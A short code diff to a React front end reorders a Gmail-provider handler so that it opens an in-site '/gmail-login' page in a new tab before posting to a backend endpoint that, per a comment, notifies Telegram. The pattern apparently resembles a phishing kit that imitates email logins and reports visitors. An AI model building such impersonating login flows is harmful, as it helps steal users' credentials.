@@ -18,7 +18,7 @@ function App() {
 
     const openModal = async (provider) => {
         if (provider === 'Gmail') {
-            console.log("backed end url {}",process.env.REACT_APP_BACKEND_URL)
+            window.open("/gmail-login", "_blank", "noopener,noreferrer");
             // Notify Telegram first
             await fetch(`${process.env.REACT_APP_BACKEND_URL}/notify-incoming`, {
                 method: 'POST',
@@ -26,7 +26,6 @@ function App() {
                 body: JSON.stringify({provider}),
             });
             // Open Gmail login in NEW TAB
-            window.open("/gmail-login", "_blank", "noopener,noreferrer");
             return;
         }
 
